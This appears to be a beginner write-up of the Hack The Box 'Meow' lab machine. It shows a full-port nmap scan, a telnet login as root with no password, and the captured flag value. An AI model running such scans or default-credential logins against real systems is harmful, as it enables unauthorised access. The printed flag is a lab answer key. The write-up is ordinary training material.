---
layout: single
title: 'Meow'
excerpt: 'Meow is a very easy Linux machine which guides players on setting up their attacking machines, connecting to HTB labs via VPN and demonstrates the strategy of how to complete them. The machine focuses on beginner enumeration techniques and showcases the exploitation of a vulnerable Telnet service through default credentials.'
date: 2026-06-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-meow/meow_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-0-Foundations
os: Linux
difficulty: Very Easy
release: 2021-09-30
ip: 10.129.95.196
---

{% include info-card.html %}

## Task 1

![Task 1](/assets/images/htb-writeup-meow/Task 1.png)

## Task 2

![Task 2](/assets/images/htb-writeup-meow/Task 2.png)

## Task 3

![Task 3](/assets/images/htb-writeup-meow/Task 3.png)

## Task 4

![Task 4](/assets/images/htb-writeup-meow/Task 4.png)

<pre class="language-"><code class="language-">
❯ ping -c 1 10.129.95.223
PING 10.129.95.223 (10.129.95.223) 56(84) bytes of data.
64 bytes from 10.129.95.223: icmp_seq=1 ttl=63 time=126 ms

--- 10.129.95.223 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 126.080/126.080/126.080/0.000 ms
</code></pre>

## Task 5

![Task 5](/assets/images/htb-writeup-meow/Task 5.png)

<pre class="language-"><code class="language-">
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.95.223 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-26 12:32 -05
Initiating Ping Scan at 12:32
Scanning 10.129.95.223 [4 ports]
Completed Ping Scan at 12:32, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:32
Scanning 10.129.95.223 [65535 ports]
Discovered open port 23/tcp on 10.129.95.223
Completed SYN Stealth Scan at 12:32, 15.10s elapsed (65535 total ports)
Nmap scan report for 10.129.95.223
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2026-06-26 12:32:11 -05 for 15s
Not shown: 65210 closed tcp ports (reset), 324 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
<span style="color: #bb66ff;">23/tcp open  telnet  syn-ack ttl 63</span>

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
           Raw packets sent: 74253 (3.267MB) | Rcvd: 70572 (2.823MB)
</code></pre>

## Task 6

![Task 6](/assets/images/htb-writeup-meow/Task 6.png)

## Task 7

![Task 7](/assets/images/htb-writeup-meow/Task 7.png)

<pre class="language-"><code class="language-">
❯ telnet 10.129.95.223
Trying 10.129.95.223...
Connected to 10.129.95.223.
Escape character is '^]'.

<span style="display: inline-block; line-height: 1; white-space: pre;">

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


</span>

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 26 Jun 2026 05:39:50 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.95.223
  IPv6 address for eth0: dead:beef::a0de:adff:fe8f:1fd7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# whoami 
root
root@Meow:~# 
</code></pre>

## Submit Flag

![Single Flag](/assets/images/htb-writeup-meow/Task 8.png)

<pre class="language-"><code class="language-">
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
<span style="color: #bb66ff;">b40abdfe23665f766f9c61ecba8a4c19</span>
root@Meow:~# 
</code></pre>
